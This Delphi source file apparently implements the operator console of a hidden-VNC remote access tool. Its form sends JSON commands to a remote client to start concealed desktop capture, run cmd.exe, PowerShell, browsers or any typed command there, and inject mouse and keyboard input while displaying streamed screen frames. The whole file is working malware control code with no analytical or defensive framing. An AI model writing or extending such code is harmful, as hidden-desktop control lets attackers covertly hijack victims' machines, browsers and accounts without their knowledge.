unit UnitHiddenVNC;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.ExtCtrls, Vcl.StdCtrls,
  System.JSON, ncLines, Vcl.Imaging.jpeg, System.SyncObjs;

type
  TForm10 = class(TForm)
    PaintBox1: TPaintBox;
    StatusBar1: TStatusBar;
    Panel1: TPanel;
    Button1: TButton;
    ComboBox1: TComboBox;
    ComboBox2: TComboBox;
    Button2: TButton;
    Button3: TButton;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure PaintBox1Paint(Sender: TObject);
    procedure PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure PaintBox1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure PaintBox1MouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
    procedure FormKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
  private
    type
      TSendJSONProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
      TUnregisterProc = procedure(aLine: TncLine) of object;
  private
    FLine: TncLine;
    FClientID: string;
    FSendJSON: TSendJSONProc;
    FOnUnregister: TUnregisterProc;
    FIsCapturing: Boolean;
    FLastBitmap: TBitmap;
    FImageLock: TObject;

    procedure SendHVNCCommand(const Action: string; Params: TJSONObject = nil);
    procedure UpdateUI;
  public
    constructor Create(AOwner: TComponent); override;
    destructor Destroy; override;
    procedure SetupForClient(aLine: TncLine; const ClientID: string;
      SendJSONProc: TSendJSONProc;
      UnregisterProc: TUnregisterProc);
    procedure DetachCallbacks;
    procedure HandleHVNCJSON(JSONObj: TJSONObject);
    procedure QueueFrameBytes(const Bytes: TBytes);
  end;

var
  Form10: TForm10;

implementation

{$R *.dfm}

constructor TForm10.Create(AOwner: TComponent);
begin
  inherited Create(AOwner);
  FImageLock := TObject.Create;
  FLastBitmap := TBitmap.Create;
  FIsCapturing := False;
end;

destructor TForm10.Destroy;
begin
  FLastBitmap.Free;
  FImageLock.Free;
  inherited;
end;

procedure TForm10.DetachCallbacks;
begin
  FLine := nil;
  FSendJSON := nil;
  FOnUnregister := nil;
end;

procedure TForm10.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if FIsCapturing then
    Button1Click(nil);

  if Assigned(FOnUnregister) and Assigned(FLine) then
    FOnUnregister(FLine);

  Action := caFree;
end;

procedure TForm10.SetupForClient(aLine: TncLine; const ClientID: string;
  SendJSONProc: TSendJSONProc;
  UnregisterProc: TUnregisterProc);
begin
  FLine := aLine;
  FClientID := ClientID;
  FSendJSON := SendJSONProc;
  FOnUnregister := UnregisterProc;

  Caption := 'Hidden VNC - ' + ClientID;

  ComboBox1.Items.Clear;
  ComboBox1.Items.Add('10%');
  ComboBox1.Items.Add('20%');
  ComboBox1.Items.Add('30%');
  ComboBox1.Items.Add('40%');
  ComboBox1.Items.Add('50%');
  ComboBox1.Items.Add('60%');
  ComboBox1.Items.Add('70%');
  ComboBox1.Items.Add('80%');
  ComboBox1.Items.Add('90%');
  ComboBox1.Items.Add('100%');
  ComboBox1.ItemIndex := 4; // 50%

  ComboBox2.Items.Clear;
  ComboBox2.Items.Add('cmd.exe');
  ComboBox2.Items.Add('powershell.exe');
  ComboBox2.Items.Add('explorer.exe');
  ComboBox2.Items.Add('chrome.exe');
  ComboBox2.Items.Add('msedge.exe');
  ComboBox2.ItemIndex := 0;

  OnClose := FormClose;
  OnKeyDown := FormKeyDown;
  OnKeyUp := FormKeyUp;
  KeyPreview := True;
  UpdateUI;
end;

procedure TForm10.UpdateUI;
begin
  if FIsCapturing then
  begin
    Button1.Caption := 'Stop Capture';
    Button1.Font.Color := clRed;
  end
  else
  begin
    Button1.Caption := 'Start Capture';
    Button1.Font.Color := clWindowText;
  end;
end;

procedure TForm10.SendHVNCCommand(const Action: string; Params: TJSONObject);
var
  JSON: TJSONObject;
  Pair: TJSONPair;
begin
  if not Assigned(FLine) or not Assigned(FSendJSON) then
  begin
    if Assigned(Params) then Params.Free;
    Exit;
  end;

  JSON := TJSONObject.Create;
  JSON.AddPair('action', Action);
  if Assigned(Params) then
  begin
    for Pair in Params do
      JSON.AddPair(TJSONPair(Pair.Clone));
    Params.Free;
  end;

  FSendJSON(FLine, JSON);
  JSON.Free;
end;

procedure TForm10.Button1Click(Sender: TObject);
var
  Params: TJSONObject;
  QualityStr: string;
  Quality: Integer;
begin
  if not FIsCapturing then
  begin
    QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
    Quality := StrToIntDef(QualityStr, 50);

    Params := TJSONObject.Create;
    Params.AddPair('quality', TJSONNumber.Create(Quality));
    SendHVNCCommand('hvnc_start', Params);
    FIsCapturing := True;
    StatusBar1.SimpleText := 'Starting HVNC...';
  end
  else
  begin
    SendHVNCCommand('hvnc_stop');
    FIsCapturing := False;
    StatusBar1.SimpleText := 'Stopped';
  end;
  UpdateUI;
end;

procedure TForm10.Button2Click(Sender: TObject);
var
  Params: TJSONObject;
begin
  Params := TJSONObject.Create;
  Params.AddPair('path', ComboBox2.Text);
  SendHVNCCommand('hvnc_run', Params);
  StatusBar1.SimpleText := 'Running: ' + ComboBox2.Text;
end;

procedure TForm10.Button3Click(Sender: TObject);
var
  CustomPath: string;
  Params: TJSONObject;
begin
  CustomPath := InputBox('Run Custom Process', 'Enter full path or command:', '');
  if CustomPath <> '' then
  begin
    Params := TJSONObject.Create;
    Params.AddPair('path', CustomPath);
    SendHVNCCommand('hvnc_run', Params);
    StatusBar1.SimpleText := 'Running custom: ' + CustomPath;
  end;
end;

procedure TForm10.HandleHVNCJSON(JSONObj: TJSONObject);
var
  Action, Status, Msg: string;
begin
  Action := JSONObj.GetValue('action').Value;
  if Action = 'hvnc_status' then
  begin
    Status := JSONObj.GetValue('status').Value;
    StatusBar1.SimpleText := Status;
  end
  else if Action = 'hvnc_error' then
  begin
    Msg := JSONObj.GetValue('error').Value;
    StatusBar1.SimpleText := 'Error: ' + Msg;
    FIsCapturing := False;
    UpdateUI;
  end;
end;

procedure TForm10.QueueFrameBytes(const Bytes: TBytes);
var
  MS: TMemoryStream;
  JPG: TJPEGImage;
begin
  MS := TMemoryStream.Create;
  try
    if Length(Bytes) > 0 then
      MS.WriteBuffer(Bytes[0], Length(Bytes));
    MS.Position := 0;

    JPG := TJPEGImage.Create;
    try
      try
        JPG.LoadFromStream(MS);
      except
        Exit;
      end;
      System.SyncObjs.TMonitor.Enter(FImageLock);
      try
        FLastBitmap.Assign(JPG);
      finally
        System.SyncObjs.TMonitor.Exit(FImageLock);
      end;
    finally
      JPG.Free;
    end;
  finally
    MS.Free;
  end;

  System.Classes.TThread.Queue(nil,
    procedure
    begin
      PaintBox1.Invalidate;
    end);
end;

procedure TForm10.PaintBox1Paint(Sender: TObject);
begin
  System.SyncObjs.TMonitor.Enter(FImageLock);
  try
    if not FLastBitmap.Empty then
      PaintBox1.Canvas.StretchDraw(PaintBox1.ClientRect, FLastBitmap);
  finally
    System.SyncObjs.TMonitor.Exit(FImageLock);
  end;
end;

procedure TForm10.PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  Params: TJSONObject;
  Btn: Integer;
begin
  Btn := 0;
  if Button = mbRight then Btn := 1
  else if Button = mbMiddle then Btn := 2;

  Params := TJSONObject.Create;
  Params.AddPair('event', 'down');
  Params.AddPair('button', TJSONNumber.Create(Btn));
  if PaintBox1.Width > 0 then
    Params.AddPair('x', TJSONNumber.Create(MulDiv(X, 65535, PaintBox1.Width)))
  else
    Params.AddPair('x', TJSONNumber.Create(0));

  if PaintBox1.Height > 0 then
    Params.AddPair('y', TJSONNumber.Create(MulDiv(Y, 65535, PaintBox1.Height)))
  else
    Params.AddPair('y', TJSONNumber.Create(0));

  SendHVNCCommand('hvnc_input', Params);
end;

procedure TForm10.FormKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
var
  Params: TJSONObject;
begin
  if not FIsCapturing then Exit;

  Params := TJSONObject.Create;
  Params.AddPair('event', 'key_down');
  Params.AddPair('key', TJSONNumber.Create(Key));
  SendHVNCCommand('hvnc_input', Params);
end;

procedure TForm10.FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
var
  Params: TJSONObject;
begin
  if not FIsCapturing then Exit;

  Params := TJSONObject.Create;
  Params.AddPair('event', 'key_up');
  Params.AddPair('key', TJSONNumber.Create(Key));
  SendHVNCCommand('hvnc_input', Params);
end;

procedure TForm10.PaintBox1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  Params: TJSONObject;
  Btn: Integer;
begin
  Btn := 0;
  if Button = mbRight then Btn := 1
  else if Button = mbMiddle then Btn := 2;

  Params := TJSONObject.Create;
  Params.AddPair('event', 'up');
  Params.AddPair('button', TJSONNumber.Create(Btn));

  if PaintBox1.Width > 0 then
    Params.AddPair('x', TJSONNumber.Create(MulDiv(X, 65535, PaintBox1.Width)))
  else
    Params.AddPair('x', TJSONNumber.Create(0));

  if PaintBox1.Height > 0 then
    Params.AddPair('y', TJSONNumber.Create(MulDiv(Y, 65535, PaintBox1.Height)))
  else
    Params.AddPair('y', TJSONNumber.Create(0));

  SendHVNCCommand('hvnc_input', Params);
end;

procedure TForm10.PaintBox1MouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
var
  Params: TJSONObject;
begin
  if not FIsCapturing then Exit;

  Params := TJSONObject.Create;
  Params.AddPair('event', 'move');

  if PaintBox1.Width > 0 then
    Params.AddPair('x', TJSONNumber.Create(MulDiv(X, 65535, PaintBox1.Width)))
  else
    Params.AddPair('x', TJSONNumber.Create(0));

  if PaintBox1.Height > 0 then
    Params.AddPair('y', TJSONNumber.Create(MulDiv(Y, 65535, PaintBox1.Height)))
  else
    Params.AddPair('y', TJSONNumber.Create(0));

  SendHVNCCommand('hvnc_input', Params);
end;

end.
